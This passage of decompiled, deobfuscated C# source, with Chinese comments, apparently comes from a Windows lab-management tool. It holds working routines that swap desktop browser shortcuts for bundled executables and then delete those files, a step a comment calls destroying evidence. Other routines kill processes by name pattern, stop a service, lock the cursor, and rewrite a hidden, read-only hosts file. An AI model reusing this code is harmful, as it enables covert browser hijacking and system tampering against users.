						ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "qq", target, RegistryValueKind.String);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						File.Copy(Application.StartupPath + "\\zy\\QQ浏览器.exe", publicDesktop + "\\QQ浏览器.exe", true);
						replacedCount++;
					}
					else if (Strings.InStr(lnkFile, "谷歌浏览器", CompareMethod.Binary) > 0)
					{
						Interaction.MsgBox("删除桌面上假google chrome的快捷方式，win7先下载安装正版google chrome再重新设置。", MsgBoxStyle.OkOnly, null);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
					}
					else if (Strings.InStr(lnkFile, "极速浏览器", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "jisu", target, RegistryValueKind.String);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						File.Copy(Application.StartupPath + "\\zy\\极速浏览器.exe", publicDesktop + "\\极速浏览器.exe", true);
						replacedCount++;
					}
					else if (Strings.InStr(lnkFile, "双核浏览器", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "shuanghe", target, RegistryValueKind.String);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						File.Copy(Application.StartupPath + "\\zy\\双核浏览器.exe", publicDesktop + "\\双核浏览器.exe", true);
						replacedCount++;
					}
					else if (Strings.InStr(lnkFile, "Microsoft Edge", CompareMethod.Binary) > 0)
					{
						string target = this.ReadLnkTargetPath(lnkFile);
						File.SetAttributes(lnkFile, FileAttributes.Normal);
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
						if (Strings.InStr(target, ".exe", CompareMethod.Binary) > 0)
						{
							ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software", "edge", target, RegistryValueKind.String);
							File.Copy(Application.StartupPath + "\\zy\\Microsoft Edge.exe", publicDesktop + "\\Microsoft Edge.exe", true);
							replacedCount++;
						}
					}
				}
				// 5) 一个都没替换过 → 用户桌面放"百度搜索&网址导航.url"
				if (replacedCount == 0)
				{
					File.Copy(Application.StartupPath + "\\zy\\百度搜索&网址导航.url", userDesktop + "\\百度搜索&网址导航.url", true);
				}
				// 6) 删除用户桌面含"网址导航/上网导航/百度一下"的 .lnk
				foreach (string lnkFile in Reader.MyComputer.FileSystem.GetFiles(userDesktop, Microsoft.VisualBasic.FileIO.SearchOption.SearchTopLevelOnly, new string[]
				{
					"*.lnk"
				}))
				{
					if (Strings.InStr(lnkFile, "网址导航", CompareMethod.Binary) > 0 | Strings.InStr(lnkFile, "上网导航", CompareMethod.Binary) > 0 | Strings.InStr(lnkFile, "百度一下", CompareMethod.Binary) > 0)
					{
						Microsoft.VisualBasic.FileSystem.Kill(lnkFile);
					}
				}
				// 7) 删除 \zy\ 目录全部文件（销毁证据）
				foreach (string file in Reader.MyComputer.FileSystem.GetFiles(Application.StartupPath + "\\zy\\", Microsoft.VisualBasic.FileIO.SearchOption.SearchAllSubDirectories, new string[]
				{
					"*.*"
				}))
				{
					Reader.MyComputer.FileSystem.DeleteFile(file, UIOption.OnlyErrorDialogs, RecycleOption.DeletePermanently, UICancelOption.DoNothing);
				}
			}
			catch (Exception ex) { /* 原混淆样板：忽略错误 */ }
		}

		/// <summary>
		/// 用 WScript.Shell COM 读取 .lnk 快捷方式的 TargetPath。
		/// </summary>
		// Token: 0x060000B5 RID: 181 RVA: 0x00009D3C File Offset: 0x00007F3C
		public string ReadLnkTargetPath(string strFile)
		{
			Type typeFromProgID = Type.GetTypeFromProgID("WScript.Shell");
			object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(typeFromProgID));
			object instance = objectValue;
			Type type = null;
			string memberName = "CreateShortcut";
			object[] array = new object[]
			{
				strFile
			};
			object[] arguments = array;
			string[] argumentNames = null;
			Type[] typeArguments = null;
			bool[] array2 = new bool[]
			{
				true
			};
			object obj = NewLateBinding.LateGet(instance, type, memberName, arguments, argumentNames, typeArguments, array2);
			if (array2[0])
			{
				strFile = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			object objectValue2 = RuntimeHelpers.GetObjectValue(obj);
			string result = Conversions.ToString(NewLateBinding.LateGet(objectValue2, null, "TargetPath", new object[0], null, null, null));
			Marshal.ReleaseComObject(RuntimeHelpers.GetObjectValue(objectValue2));
			Marshal.ReleaseComObject(RuntimeHelpers.GetObjectValue(objectValue));
			return result;
		}

		/// <summary>
		/// 点击帮助按钮：打开 http://www.jfglzs.com/software/bangzhu.htm。
		/// </summary>
		// Token: 0x060000B6 RID: 182 RVA: 0x000023E4 File Offset: 0x000005E4
		private void Button3_Click_OpenHelpPage(object sender, EventArgs e)
		{
			Process.Start("http://www.jfglzs.com/software/bangzhu.htm");
		}

		/// <summary>
		/// 保存前清理旧环境：杀 ExceptionMock.RandomProcessName 随机名进程、jfglzsn、zmserv；
		/// 遍历全部进程，进程名每个字符 ASCII 均在 [102,111]（'f'~'o'）→ Kill（状态机中为混淆常量判断）；
		/// DisableCMD=0；net stop zmserv；ClipCursor 锁定鼠标到全屏矩形。
		/// </summary>
		// Token: 0x060000B7 RID: 183 RVA: 0x00009DF4 File Offset: 0x00007FF4
		// [反混淆] 原状态机125行 → 还原为正常控制流48行
		private void PreSaveCleanup_KillOldProcesses()
		{
			try
			{
				// 1) 杀随机名进程与 jfglzsn（do-while：反复杀直到两者进程数组都为空）
				string randomProcessName = Conversions.ToString(ExceptionMock.RandomProcessName);
				string jfglzsnName = "jfglzsn";
				Process[] randomProcs;
				Process[] jfglzsnProcs;
				do
				{
					randomProcs = Process.GetProcessesByName(randomProcessName);
					randomProcs[0].Kill();
					jfglzsnProcs = Process.GetProcessesByName(jfglzsnName);
					jfglzsnProcs[0].Kill();
				}
				while (!(randomProcs.Length == 0 & jfglzsnProcs.Length == 0));
				// 2) 禁 CMD、停 zmserv 服务、等1秒后杀残留 zmserv 进程
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 0, RegistryValueKind.DWord);
				Interaction.Shell("net stop zmserv", AppWinStyle.Hide, true, -1);
				Thread.Sleep(1000);
				Process[] zmservProcs = Process.GetProcessesByName("zmserv");
				zmservProcs[0].Kill();
				// 3) 遍历全部进程：进程名长度>=4 且每个字符 ASCII 均在 [102,111]（'f'~'o'）→ Kill
				int asciiLower = 10 * 10 + 2; // 102 = 'f'（原状态机混淆常量）
				Process[] allProcesses = Process.GetProcesses();
				for (int i = 0; i < allProcesses.Length; i++)
				{
					Process process = allProcesses[i];
					int nameLength = Strings.Len(process.ProcessName);
					if (nameLength >= 4)
					{
						int j;
						for (j = 1; j <= nameLength; j++)
						{
							int charCode = Strings.Asc(Strings.Mid(process.ProcessName, j, 1));
							if (charCode < asciiLower)
							{
								break;
							}
							if (charCode > asciiLower + 9)
							{
								break;
							}
						}
						if (j == nameLength + 1) // 循环完整跑完 = 全部字符都在区间内
						{
							process.Kill();
						}
					}
				}
				// 4) 锁定鼠标到全屏矩形
				Form1.RECT lpRect;
				lpRect.Left = 0;
				lpRect.Top = 0;
				lpRect.Right = Screen.PrimaryScreen.Bounds.Width;
				lpRect.Bottom = Screen.PrimaryScreen.Bounds.Height;
				Form1.ClipCursor(lpRect);
			}
			catch (Exception ex) { /* 原混淆样板：忽略错误 */ }
		}

		/// <summary>
		/// 点击"选择壁纸"：OpenFileDialog 选图片 → SetWallpaper(path, Stretched)。
		/// </summary>
		// Token: 0x060000B8 RID: 184 RVA: 0x0000A13C File Offset: 0x0000833C
		private void Button_selectpic_Click_ChooseWallpaper(object sender, EventArgs e)
		{
			string text = "";
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Image Files|*.bmp;*.jpg;*.jpeg;*.png";
				openFileDialog.InitialDirectory = Application.StartupPath + "\\wallpaper";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					text = openFileDialog.FileName;
				}
			}
			if (string.IsNullOrEmpty(text))
			{
				MessageBox.Show("请先选择图片文件");
				return;
			}
			try
			{
				this.SetWallpaper(text, Form1.WallpaperStyle.Stretched);
			}
			catch (Exception ex)
			{
				MessageBox.Show("设置失败: {ex.Message}");
			}
		}

		/// <summary>
		/// 点击"恢复默认壁纸"：用 C:\Windows\Web\Wallpaper\Windows\img0.jpg 恢复。
		/// </summary>
		// Token: 0x060000B9 RID: 185 RVA: 0x0000A1E4 File Offset: 0x000083E4
		private void Button_restorepic_Click_RestoreWallpaper(object sender, EventArgs e)
		{
			string string_ = "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg";
			try
			{
				this.SetWallpaper(string_, Form1.WallpaperStyle.Stretched);
			}
			catch (Exception ex)
			{
				MessageBox.Show("设置失败: {ex.Message}");
			}
		}

		/// <summary>
		/// 设置壁纸：写 HKCU Control Panel\Desktop 的 Wallpaper/WallpaperStyle（按 style 枚举映射 1/2/6），
		/// 再 SystemParametersInfo(20,...) 通知系统刷新（P/Invoke）。
		/// </summary>
		// Token: 0x060000BA RID: 186 RVA: 0x0000A22C File Offset: 0x0000842C
		private void SetWallpaper(string path, Form1.WallpaperStyle style)
		{
			if (!File.Exists(path))
			{
				throw new ArgumentException("指定的图片文件不存在");
			}
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true))
			{
				registryKey.SetValue("Wallpaper", path);
				registryKey.SetValue("WallpaperStyle", "2");
			}
			if (!Form1.SystemParametersInfo(20, 0, path, 3))
			{
				throw new Win32Exception();
			}
		}

		/// <summary>
		/// hosts 追加屏蔽项："127.0.0.1 <domain>"（已有则去重不重复追加）。
		/// </summary>
		// Token: 0x060000BB RID: 187 RVA: 0x0000A2A8 File Offset: 0x000084A8
		// [反混淆] 原状态机49行 → 还原为正常控制流13行
		private void AddHostsEntry_BlockDomain(string domain)
		{
			try
			{
				string prefix = "127.0.0.1";
				string hostsContent = File.ReadAllText(this.hostsFilePath);
				// 已有该屏蔽项则不重复追加
				if (!hostsContent.Contains(prefix + " " + domain))
				{
					hostsContent = hostsContent + Environment.NewLine + prefix + " " + domain;
					File.WriteAllText(this.hostsFilePath, hostsContent);
				}
			}
			catch (Exception ex) { /* 原混淆样板：忽略错误 */ }
		}

		/// <summary>
		/// 取运行中进程的路径：GetProcessesByName(processName) 的 MainModule.FileName。
		/// </summary>
		// Token: 0x060000BC RID: 188 RVA: 0x0000A3BC File Offset: 0x000085BC
		// [反混淆] 原状态机66行 → 还原为正常控制流18行
		public string GetRunningProcessPath(string processName)
		{
			try
			{
				string result = "";
				Process[] processes = Process.GetProcessesByName(processName);
				// 逐个取进程主模块路径，后一个覆盖前一个（等价于取最后一个匹配进程）
				for (int i = 0; i < processes.Length; i++)
				{
					result = processes[i].MainModule.FileName;
				}
				return result;
			}
			catch (Exception ex) { /* 原混淆样板：忽略错误 */ }
			return "";
		}

		/// <summary>
		/// 点击下载链接：打开 https://www.jfglzs.com/c16.html。
		/// </summary>
		// Token: 0x060000BD RID: 189 RVA: 0x000023F1 File Offset: 0x000005F1
		private void LinkLabel2_Click_OpenDownloadPage(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Process.Start("https://www.jfglzs.com/c16.html");
		}

		/// <summary>
		/// 下载黑名单写 hosts（状态机还原）：
		/// 1) 先探测 baidu:443 不通则 blacklistApplied=false 返回；WebClient 下载黑名单（本地 hmd_local.txt 或 http://www.zmyxl2008.com/hmd_net.txt）到临时文件；
		/// 2) 首行必须含 "www." 否则失败；定位"视频网站："与"产品名："分节标记；读现有 hosts 已屏蔽的 127.0.0.1 域名入 HashSet 去重；
		/// 3) 黑名单[0..产品名) 全部追加；flag=="off" 时"视频网站："到"产品名："之间也追加；
		/// 4) 写回 hosts → 设 ReadOnly+Hidden+System → ipconfig /flushdns。
		/// </summary>
		// Token: 0x060000BE RID: 190 RVA: 0x0000A4B8 File Offset: 0x000086B8
		// [反混淆] 原状态机103行 → 还原为正常控制流85行
		private void UpdateHostsBlacklist(string url, string flag)
		{
			try
			{
				// 1) 先探测 baidu:443，不通则直接失败返回
				if (!this.IsPortOpen("www.baidu.com", 443, 2000))
				{
					this.blacklistApplied = false;
					return;
				}
				// 2) 下载黑名单（本地 hmd_local.txt 或 http://www.zmyxl2008.com/hmd_net.txt）到临时文件
				string tempFileName = Path.GetTempFileName();
				using (WebClient webClient = new WebClient())
				{
					webClient.DownloadFile(url, tempFileName);
				}
				string[] blacklistLines = File.ReadAllLines(tempFileName);
				// 3) 首行必须含 "www."，否则失败返回
				if (Strings.InStr(blacklistLines[0], "www.", CompareMethod.Binary) == 0)
				{
					this.blacklistApplied = false;
					return;
				}
				// 4) 定位“视频网站：”与“产品名：”两个分节标记（记录标记前后的行号边界）
				int lineCount = 0;
				int videoSectionEnd = 0; // “视频网站：”前一行的下标；文件正常含两个标记
				int afterVideoMarker = 0; // “视频网站：”后一行的下标
				int productSectionEnd = 0; // “产品名：”前一行的下标
				for (int i = 0; i < blacklistLines.Length; i++)
				{
					string line = blacklistLines[i];
					if (Operators.CompareString(line, "视频网站：", false) == 0)
					{
						videoSectionEnd = lineCount - 1;
						afterVideoMarker = lineCount + 1;
					}
					if (Operators.CompareString(line, "产品名：", false) == 0)
					{
						productSectionEnd = lineCount - 1;
					}
					lineCount++;
				}
				// 5) 读现有 hosts 中已屏蔽的 127.0.0.1 域名入 HashSet 去重
				File.SetAttributes(this.hostsAbsolutePath, FileAttributes.Normal);
				File.SetAttributes(this.hostsAbsolutePath, FileAttributes.Normal); // 原代码重复执行两次
				string hostsContent = File.ReadAllText(this.hostsAbsolutePath);
				HashSet<string> existingDomains = new HashSet<string>();
				string[] hostsLines = hostsContent.Split(new string[]
				{
					Environment.NewLine
				}, StringSplitOptions.None);
				for (int j = 0; j < hostsLines.Length; j++)
				{
					string hostsLine = hostsLines[j];
					if (hostsLine.Trim().StartsWith("127.0.0.1"))
					{
						string[] parts = hostsLine.Trim().Split(new char[]
						{
							' '
						}, StringSplitOptions.RemoveEmptyEntries);
						if (parts.Length > 1)
						{
							existingDomains.Add(parts[1].ToLower());
						}
					}
				}
				// 6) 追加黑名单：[0..视频网站前) 的域名行全部加入 hosts
				StringBuilder newHosts = new StringBuilder(hostsContent);
				newHosts.AppendLine();
				for (int k = 0; k <= videoSectionEnd; k++)
				{
					if (!string.IsNullOrEmpty(blacklistLines[k].Trim()))
					{
						string domain = blacklistLines[k].Trim().Split(new char[]
						{
							'/'
						})[0].Replace("http://", "").Replace("https://", "").ToLower();
						if (!existingDomains.Contains(domain))
						{
							newHosts.AppendLine("127.0.0.1 " + domain);
						}
					}
				}
				// 7) flag=="off" 时，两个标记之间的“视频网站”区段域名也追加
				if (Operators.CompareString(flag, "off", false) == 0)
				{
					for (int l = afterVideoMarker; l <= productSectionEnd; l++)
					{
						if (!string.IsNullOrEmpty(blacklistLines[l].Trim()))
						{
							string domain2 = blacklistLines[l].Trim().Split(new char[]
							{
								'/'
							})[0].Replace("http://", "").Replace("https://", "").ToLower();
							if (!existingDomains.Contains(domain2))
							{
								newHosts.AppendLine("127.0.0.1 " + domain2);
							}
						}
					}
				}
				// 8) 写回 hosts → 设 ReadOnly+Hidden+System → 禁 CMD → 刷新 DNS 缓存
				File.WriteAllText(this.hostsAbsolutePath, newHosts.ToString());
				this.blacklistApplied = true;
				File.SetAttributes(this.hostsAbsolutePath, File.GetAttributes(this.hostsAbsolutePath) | FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
				ExceptionMock.WriteRegistryValue(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 0, RegistryValueKind.DWord);
				Interaction.Shell("ipconfig /flushdns", AppWinStyle.Hide, true, -1);
			}
			catch (Exception ex) { /* 原混淆样板：忽略错误 */ }
		}

		/// <summary>
		/// ICMP 连通探测：NetworkInterface.GetIsNetworkAvailable() 后 Ping.Send(host, timeout)，Status==Success。
		/// </summary>
		// Token: 0x060000BF RID: 191 RVA: 0x0000AA64 File Offset: 0x00008C64
		private bool PingHost_ICMP(string host, int timeout)
		{
			if (!NetworkInterface.GetIsNetworkAvailable())
			{
				return false;
			}
			bool result;
			try
			{
				Ping ping = new Ping();
				PingReply pingReply = ping.Send(host, timeout);
				if (pingReply.Status == IPStatus.Success)
				{
					result = true;
				}
				else
				{
					result = false;
				}
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		/// <summary>
		/// TCP 连通探测：BeginConnect + AsyncWaitHandle.WaitOne(超时)，超时或异常返回 false。
		/// </summary>
		// Token: 0x060000C0 RID: 192 RVA: 0x0000AABC File Offset: 0x00008CBC
		public bool IsPortOpen(string hostname, int port, int timeout = 2000)
		{
			bool result;
			try
			{
				using (TcpClient tcpClient = new TcpClient())
				{
					IAsyncResult asyncResult = tcpClient.BeginConnect(hostname, port, null, null);
					if (asyncResult.AsyncWaitHandle.WaitOne(TimeSpan.FromMilliseconds((double)timeout)))
					{
						tcpClient.EndConnect(asyncResult);
						result = tcpClient.Connected;
					}
					else
					{
						result = false;
					}
				}
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		/// <summary>
		/// 进程是否在运行：Process.GetProcessesByName(processName).Length > 0。
		/// </summary>
		// Token: 0x060000C1 RID: 193 RVA: 0x0000AB3C File Offset: 0x00008D3C
		private bool IsProcessRunning(string processName)
		{
			return Process.GetProcessesByName(processName).Length > 0;
		}

		/// <summary>
		/// 控件 Button1 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400000C RID: 12
		[AccessedThroughProperty("Button1")]
		private Button m_Button1;

		/// <summary>
		/// 控件 RadioButton1 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400000D RID: 13
		[AccessedThroughProperty("RadioButton1")]
		private RadioButton m_RadioButton1;

		/// <summary>
		/// 控件 RadioButton2 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400000E RID: 14
		[AccessedThroughProperty("RadioButton2")]
		private RadioButton m_RadioButton2;

		/// <summary>
		/// 控件 RadioButton4 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400000F RID: 15
		[AccessedThroughProperty("RadioButton4")]
		private RadioButton m_RadioButton4;

		/// <summary>
		/// 控件 RadioButton3 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000010 RID: 16
		[AccessedThroughProperty("RadioButton3")]
		private RadioButton m_RadioButton3;

		/// <summary>
		/// 控件 RadioButton6 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000011 RID: 17
		[AccessedThroughProperty("RadioButton6")]
		private RadioButton m_RadioButton6;

		/// <summary>
		/// 控件 RadioButton5 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000012 RID: 18
		[AccessedThroughProperty("RadioButton5")]
		private RadioButton m_RadioButton5;

		/// <summary>
		/// 控件 OpenFileDialog1 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000013 RID: 19
		[AccessedThroughProperty("OpenFileDialog1")]
		private OpenFileDialog m_OpenFileDialog1;

		/// <summary>
		/// 控件 Button2 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000014 RID: 20
		[AccessedThroughProperty("Button2")]
		private Button m_Button2;

		/// <summary>
		/// 控件 GroupBox4 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000015 RID: 21
		[AccessedThroughProperty("GroupBox4")]
		private GroupBox m_GroupBox4;

		/// <summary>
		/// 控件 Label1 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000016 RID: 22
		[AccessedThroughProperty("Label1")]
		private Label m_Label1;

		/// <summary>
		/// 控件 TextBox1 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000017 RID: 23
		[AccessedThroughProperty("TextBox1")]
		private TextBox m_TextBox1;

		/// <summary>
		/// 控件 Button3 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000018 RID: 24
		[AccessedThroughProperty("Button3")]
		private Button m_Button3;

		/// <summary>
		/// 控件 GroupBox5 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000019 RID: 25
		[AccessedThroughProperty("GroupBox5")]
		private GroupBox m_GroupBox5;

		/// <summary>
		/// 控件 pd_new 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400001A RID: 26
		[AccessedThroughProperty("pd_new")]
		private TextBox m_pd_new;

		/// <summary>
		/// 控件 Label8 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400001B RID: 27
		[AccessedThroughProperty("Label8")]
		private Label m_Label8;

		/// <summary>
		/// 控件 Label2 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400001C RID: 28
		[AccessedThroughProperty("Label2")]
		private Label m_Label2;

		/// <summary>
		/// 控件 RadioButton10 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400001D RID: 29
		[AccessedThroughProperty("RadioButton10")]
		private RadioButton m_RadioButton10;

		/// <summary>
		/// 控件 RadioButton9 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400001E RID: 30
		[AccessedThroughProperty("RadioButton9")]
		private RadioButton m_RadioButton9;

		/// <summary>
		/// 控件 Label4 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400001F RID: 31
		[AccessedThroughProperty("Label4")]
		private Label m_Label4;

		/// <summary>
		/// 控件 Label10 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000020 RID: 32
		[AccessedThroughProperty("Label10")]
		private Label m_Label10;

		/// <summary>
		/// 控件 RadioButton12 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000021 RID: 33
		[AccessedThroughProperty("RadioButton12")]
		private RadioButton m_RadioButton12;

		/// <summary>
		/// 控件 RadioButton11 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000022 RID: 34
		[AccessedThroughProperty("RadioButton11")]
		private RadioButton m_RadioButton11;

		/// <summary>
		/// 控件 GroupBox10 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000023 RID: 35
		[AccessedThroughProperty("GroupBox10")]
		private GroupBox m_GroupBox10;

		/// <summary>
		/// 控件 Button_restorepic 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000024 RID: 36
		[AccessedThroughProperty("Button_restorepic")]
		private Button m_Button_restorepic;

		/// <summary>
		/// 控件 Button_selectpic 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000025 RID: 37
		[AccessedThroughProperty("Button_selectpic")]
		private Button m_Button_selectpic;

		/// <summary>
		/// 控件 GroupBox9 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000026 RID: 38
		[AccessedThroughProperty("GroupBox9")]
		private GroupBox m_GroupBox9;

		/// <summary>
		/// 控件 RadioButton13 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000027 RID: 39
		[AccessedThroughProperty("RadioButton13")]
		private RadioButton m_RadioButton13;

		/// <summary>
		/// 控件 RadioButton14 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000028 RID: 40
		[AccessedThroughProperty("RadioButton14")]
		private RadioButton m_RadioButton14;

		/// <summary>
		/// 控件 Label11 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000029 RID: 41
		[AccessedThroughProperty("Label11")]
		private Label m_Label11;

		/// <summary>
		/// 控件 Label12 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400002A RID: 42
		[AccessedThroughProperty("Label12")]
		private Label m_Label12;

		/// <summary>
		/// 控件 Label13 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400002B RID: 43
		[AccessedThroughProperty("Label13")]
		private Label m_Label13;

		/// <summary>
		/// 控件 Label15 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400002C RID: 44
		[AccessedThroughProperty("Label15")]
		private Label m_Label15;

		/// <summary>
		/// 控件 Label16 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400002D RID: 45
		[AccessedThroughProperty("Label16")]
		private Label m_Label16;

		/// <summary>
		/// 控件 GroupBox1 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400002E RID: 46
		[AccessedThroughProperty("GroupBox1")]
		private GroupBox m_GroupBox1;

		/// <summary>
		/// 控件 GroupBox2 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400002F RID: 47
		[AccessedThroughProperty("GroupBox2")]
		private GroupBox m_GroupBox2;

		/// <summary>
		/// 控件 GroupBox3 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000030 RID: 48
		[AccessedThroughProperty("GroupBox3")]
		private GroupBox m_GroupBox3;

		/// <summary>
		/// 控件 GroupBox7 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000031 RID: 49
		[AccessedThroughProperty("GroupBox7")]
		private GroupBox m_GroupBox7;

		/// <summary>
		/// 控件 GroupBox12 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000032 RID: 50
		[AccessedThroughProperty("GroupBox12")]
		private GroupBox m_GroupBox12;

		/// <summary>
		/// 控件 Label7 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000033 RID: 51
		[AccessedThroughProperty("Label7")]
		private Label m_Label7;

		/// <summary>
		/// 控件 Label5 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000034 RID: 52
		[AccessedThroughProperty("Label5")]
		private Label m_Label5;

		/// <summary>
		/// 控件 Label9 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000035 RID: 53
		[AccessedThroughProperty("Label9")]
		private Label m_Label9;

		/// <summary>
		/// 控件 LinkLabel2 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000036 RID: 54
		[AccessedThroughProperty("LinkLabel2")]
		private LinkLabel m_LinkLabel2;

		/// <summary>
		/// 控件 Label14 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000037 RID: 55
		[AccessedThroughProperty("Label14")]
		private Label m_Label14;

		/// <summary>
		/// 控件 Label3 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000038 RID: 56
		[AccessedThroughProperty("Label3")]
		private Label m_Label3;

		/// <summary>
		/// 控件 Label6 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000039 RID: 57
		[AccessedThroughProperty("Label6")]
		private Label m_Label6;

		/// <summary>
		/// 控件 Label17 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400003A RID: 58
		[AccessedThroughProperty("Label17")]
		private Label m_Label17;

		/// <summary>
		/// 控件 GroupBox6 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400003B RID: 59
		[AccessedThroughProperty("GroupBox6")]
		private GroupBox m_GroupBox6;

		/// <summary>
		/// 控件 RadioButton8 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400003C RID: 60
		[AccessedThroughProperty("RadioButton8")]
		private RadioButton m_RadioButton8;

		/// <summary>
		/// 控件 RadioButton7 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400003D RID: 61
		[AccessedThroughProperty("RadioButton7")]
		private RadioButton m_RadioButton7;

		/// <summary>
		/// 控件 Label18 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400003E RID: 62
		[AccessedThroughProperty("Label18")]
		private Label m_Label18;

		/// <summary>
		/// 控件 GroupBox8 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400003F RID: 63
		[AccessedThroughProperty("GroupBox8")]
		private GroupBox m_GroupBox8;

		/// <summary>
		/// 控件 RadioButton15 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000040 RID: 64
		[AccessedThroughProperty("RadioButton15")]
		private RadioButton m_RadioButton15;

		/// <summary>
		/// 控件 RadioButton17 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000041 RID: 65
		[AccessedThroughProperty("RadioButton17")]
		private RadioButton m_RadioButton17;

		/// <summary>
		/// 控件 Label19 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000042 RID: 66
		[AccessedThroughProperty("Label19")]
		private Label m_Label19;

		/// <summary>
		/// 控件 Label20 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000043 RID: 67
		[AccessedThroughProperty("Label20")]
		private Label m_Label20;

		/// <summary>
		/// 控件 RadioButton16 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000044 RID: 68
		[AccessedThroughProperty("RadioButton16")]
		private RadioButton m_RadioButton16;

		/// <summary>
		/// 控件 Label21 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000045 RID: 69
		[AccessedThroughProperty("Label21")]
		private Label m_Label21;

		/// <summary>
		/// 控件 GroupBox11 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000046 RID: 70
		[AccessedThroughProperty("GroupBox11")]
		private GroupBox m_GroupBox11;

		/// <summary>
		/// 控件 RadioButton19 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000047 RID: 71
		[AccessedThroughProperty("RadioButton19")]
		private RadioButton m_RadioButton19;

		/// <summary>
